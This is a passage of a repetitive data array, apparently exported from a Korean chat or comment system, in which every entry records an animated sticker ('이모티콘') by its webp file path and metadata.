        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
